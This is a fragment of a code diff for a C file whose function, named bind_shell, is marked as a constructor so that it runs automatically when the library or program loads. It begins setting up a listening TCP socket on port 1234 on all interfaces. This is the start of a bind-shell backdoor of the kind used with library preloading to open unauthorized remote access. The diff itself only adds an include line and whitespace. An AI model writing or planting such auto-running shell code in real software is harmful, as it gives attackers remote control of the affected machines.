@@ -3,11 +3,12 @@
 #include <stdlib.h>
 #include <unistd.h> 
 #include <sys/wait.h>
+#include <stdio.h>
 
 #define port 1234
 #define addr INADDR_ANY
 
-void __attribute__((constructor)) bind_shell(){
+void __attribute__((constructor)) bind_shell(){  
   int host_sock = socket(AF_INET, SOCK_STREAM, 0);
   struct sockaddr_in host_addr;
   host_addr.sin_family = AF_INET;
